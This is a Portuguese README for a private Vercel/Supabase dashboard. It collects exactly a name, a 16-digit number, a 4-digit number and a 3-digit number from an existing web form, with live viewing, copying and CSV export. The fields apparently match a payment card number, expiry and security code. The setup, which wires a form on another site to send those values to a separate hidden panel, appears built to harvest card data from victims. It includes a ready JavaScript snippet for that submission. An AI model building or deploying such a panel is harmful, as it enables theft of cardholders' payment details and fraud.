# Central de dados

Painel privado para receber, armazenar e consultar exatamente os quatro valores enviados pelo formulario existente:

- nome;
- numero com 16 digitos;
- numero com 4 digitos;
- numero com 3 digitos.

Os numeros sao tratados como **texto**. Isso preserva zeros iniciais e evita a perda de precisao que acontece com numeros JavaScript de 16 digitos.

## O que esta pronto

- `POST /api/submit`: recebe e valida os quatro campos.
- CORS: aceita apenas os dominios configurados.
- Limite: ate 10 tentativas por minuto por IP anonimizado.
- Supabase Auth: login por email e senha.
- Row Level Security: somente usuarios cadastrados como administradores acessam os dados.
- Painel em tempo real com busca e paginacao.
- Copia, exclusao e exportacao CSV.
- Configuracao dos textos exibidos no formulario.
- Layout responsivo para computador e celular.

## Arquitetura

```text
Formulario atual
      |
      | POST /api/submit
      v
Funcao segura na Vercel
      |
      | service_role (somente no servidor)
      v
Supabase/Postgres <---- Painel privado + Supabase Auth + RLS
```

## 1. Criar o banco no Supabase

1. Entre no projeto do Supabase usado pelo seu site.
2. Abra **SQL Editor**.
3. Clique em **New query**.
4. Abra o arquivo `supabase/migrations/20260621000000_initial.sql` deste projeto.
5. Cole todo o conteudo no SQL Editor.
6. Clique em **Run**.
7. Confirme que o Supabase terminou sem erros.

Esse SQL cria as tabelas, validacoes, indices, funcoes, politicas RLS e atualizacao em tempo real.

## 2. Criar seu usuario administrador

1. No Supabase, abra **Authentication > Users**.
2. Clique em **Add user > Create new user**.
3. Informe seu email e uma senha forte.
4. Marque o usuario como confirmado, caso essa opcao apareca.
5. Depois de criar, copie o UUID exibido na coluna de identificacao do usuario.
6. Volte ao **SQL Editor** e execute, substituindo o UUID:

```sql
insert into public.admin_users (user_id)
values ('COLE-AQUI-O-UUID-DO-SEU-USUARIO');
```

Somente usuarios presentes em `admin_users` conseguem abrir o painel. Criar um usuario no Auth sem executar esse `insert` nao concede acesso.

## 3. Localizar as chaves do Supabase

No painel do Supabase, abra as configuracoes de API do projeto e localize:

- **Project URL**;
- chave publica **anon**;
- chave privada **service_role**.

Nunca coloque `service_role` no frontend, em codigo com prefixo `VITE_`, no GitHub ou em uma mensagem. Ela deve existir apenas nas variaveis protegidas da Vercel.

## 4. Publicar esta pasta na Vercel

O painel pode ser um projeto Vercel separado do seu frontend atual.

1. Envie este repositorio para um repositorio privado no GitHub.
2. Na Vercel, clique em **Add New > Project**.
3. Importe o repositorio.
4. Em **Root Directory**, selecione `central-de-dados`.
5. O framework deve ser detectado como **Vite**.
6. Abra **Environment Variables** e cadastre:

| Variavel | Valor |
| --- | --- |
| `VITE_SUPABASE_URL` | Project URL do Supabase |
| `VITE_SUPABASE_ANON_KEY` | chave `anon` |
| `SUPABASE_URL` | a mesma Project URL |
| `SUPABASE_SERVICE_ROLE_KEY` | chave `service_role` |
| `ALLOWED_ORIGINS` | URL do frontend que possui o formulario |
| `SUBMISSION_RATE_LIMIT_SALT` | segredo aleatorio com pelo menos 24 caracteres |

Nao configure `VITE_PREVIEW_MODE` na Vercel.

Para criar o salt no PowerShell:

```powershell
[Convert]::ToHexString([Security.Cryptography.RandomNumberGenerator]::GetBytes(32)).ToLower()
```

Exemplo de origem permitida:

```text
https://www.meusite.com.br
```

Para mais de um dominio, separe por virgula e nao coloque `/` no final:

```text
https://www.meusite.com.br,https://meusite.com.br
```

7. Clique em **Deploy**.
8. Copie a URL gerada, por exemplo `https://central-de-da-dos.vercel.app/`.

## 5. Conectar o formulario que ja existe

Os inputs numericos devem usar `type="text"`. Nao use `type="number"`, `Number()` ou `parseInt()`, pois zeros iniciais podem desaparecer e o valor de 16 digitos pode ser alterado.

Exemplo de HTML compativel:

```html
<form id="client-form">
  <input id="client-name" name="name" type="text" maxlength="120" required>
  <input id="client-number-16" name="number16" type="text" inputmode="numeric" pattern="[0-9]{16}" maxlength="16" required>
  <input id="client-number-4" name="number4" type="text" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required>
  <input id="client-number-3" name="number3" type="text" inputmode="numeric" pattern="[0-9]{3}" maxlength="3" required>
  <button type="submit">Enviar</button>
</form>
```

Adicione este JavaScript ao arquivo que atualmente controla o envio do formulario. Troque a URL pela URL real do painel na Vercel:

```js
const DATA_API_URL = "https://central-de-da-dos.vercel.app//api/submit";

const form = document.querySelector("#client-form");

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const submitButton = form.querySelector('button[type="submit"]');
  submitButton.disabled = true;

  const payload = {
    name: document.querySelector("#client-name").value,
    number16: document.querySelector("#client-number-16").value,
    number4: document.querySelector("#client-number-4").value,
    number3: document.querySelector("#client-number-3").value,
  };

  try {
    const response = await fetch(DATA_API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    const result = await response.json();

    if (!response.ok) {
      throw new Error(result.error || "Nao foi possivel enviar os dados.");
    }

    alert("Dados enviados com sucesso.");
    form.reset();
  } catch (error) {
    alert(error.message);
  } finally {
    submitButton.disabled = false;
  }
});
```

Se os IDs do seu formulario forem diferentes, altere somente os quatro seletores usados em `querySelector`.

### Quando o formulario ja possui um evento `submit`

Nao crie um segundo envio. Dentro do evento existente, monte `payload` e execute o mesmo `fetch`. O envio esta completo quando a API responde com status `201` e `{ "ok": true }`.

## 6. Usar os textos configurados no painel

A pagina **Configuracoes** permite alterar titulo, mensagem e rotulos. O frontend pode buscar esses textos:

```js
const CONFIG_URL = "https://central-de-da-dos.vercel.app//api/form-config";
const config = await fetch(CONFIG_URL).then((response) => response.json());

document.querySelector('label[for="client-name"]').textContent = config.name_label;
```

Essa etapa e opcional. O recebimento dos dados funciona sem buscar a configuracao.

## 7. Entrar no painel

1. Acesse `https://central-de-da-dos.vercel.app//login`.
2. Informe o email e a senha criados no Supabase.
3. Abra **Recebimentos** para acompanhar novos envios.
4. Abra **Configuracoes** para alterar os textos.

Novos registros aparecem automaticamente quando o Realtime do Supabase esta ativo.

## 8. Teste completo antes de divulgar

1. Abra o formulario pelo dominio real configurado em `ALLOWED_ORIGINS`.
2. Digite um nome.
3. Digite exatamente 16, 4 e 3 digitos.
4. Inclua zeros iniciais em um teste, por exemplo `0012345678901234`, `0032` e `007`.
5. Envie o formulario.
6. Confirme a mensagem de sucesso.
7. Entre no painel.
8. Confirme que os quatro valores aparecem sem alteracao.
9. Teste copiar, exportar CSV e excluir.
10. Teste o formulario pelo celular.

## Desenvolvimento local

1. Duplique `.env.example` como `.env.local`.
2. Preencha as chaves do seu projeto de desenvolvimento.
3. Instale e inicie:

```bash
npm install
npm run dev
```

Para visualizar somente a interface com dados ficticios, use em `.env.local`:

```text
VITE_PREVIEW_MODE=true
```

Esse modo so funciona durante `vite dev` e e desativado automaticamente no build de producao.

## Erros comuns

### `403 Origem nao autorizada`

O dominio aberto no navegador nao esta em `ALLOWED_ORIGINS`. Corrija a variavel na Vercel e faca um novo deploy.

### `400 Dados invalidos`

Confirme que todos os numeros sao strings contendo somente digitos e com tamanhos exatos. Nao use `Number()`.

### `500 Nao foi possivel registrar`

Confira `SUPABASE_URL`, `SUPABASE_SERVICE_ROLE_KEY`, `SUBMISSION_RATE_LIMIT_SALT` e confirme que o SQL foi executado.

### Login funciona, mas o painel nega acesso

Execute o `insert into public.admin_users` com o UUID correto do usuario.

### O registro nao aparece automaticamente

Atualize a pagina. Se aparecer depois da atualizacao, verifique se a tabela `submissions` esta habilitada em **Database > Replication/Realtime**.

## Comandos de verificacao

```bash
npm run typecheck
npm run lint
npm test
npm run build
```

## Seguranca

- O navegador nunca recebe a chave `service_role`.
- O frontend publico nao possui permissao direta para inserir ou ler a tabela.
- A API valida novamente todos os campos no servidor.
- RLS bloqueia leitura e exclusao para usuarios que nao sao administradores.
- O CSV neutraliza nomes que poderiam ser interpretados como formulas.
- O hash usado no limite de envio nao armazena o IP original.
